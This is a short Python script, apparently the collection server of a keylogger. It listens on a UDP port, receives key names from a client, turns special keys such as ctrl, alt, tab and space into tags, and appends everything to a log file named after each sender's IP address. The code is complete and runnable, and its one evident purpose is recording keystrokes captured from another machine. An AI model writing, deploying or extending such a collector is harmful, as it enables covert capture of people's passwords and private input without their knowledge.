import socket

class Server():
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.name = 'localhost'
        self.port = 12345
        self.is_open = True
        self.server.bind((self.name, self.port))
        

    def register(self,answer):
        if answer == 'ctrl':
            return '  <ctrl>  '
        if answer == 'alt':
            return '  <alt>  '
        if answer == 'tab':
            return '  <tab>  '
        if answer == 'space':
            return '<space> '
        return "\n" + answer

    def start(self):
        print('Attente de Connexion:')

        # Attente de l'autentification duc client
        answer, addr = self.server.recvfrom(1024)
        fichier = open(f'./{addr[0]}.txt', 'a')
        count = 0
        while self.is_open:
            answer = self.server.recvfrom(1024)[0].decode()
            try:
                
                # Ecriture dans le fichier texte
                if count % 2 == 0:
                    fichier.write(self.register(answer)) 
                    print(answer)
                count += 1   
            
            except:
                pass
            
            # Sauvegarde des entrées
            fichier.close()
            fichier = open(f'./{addr[0]}.txt', 'a')

        fichier.close()
            
server = Server()
server.start()
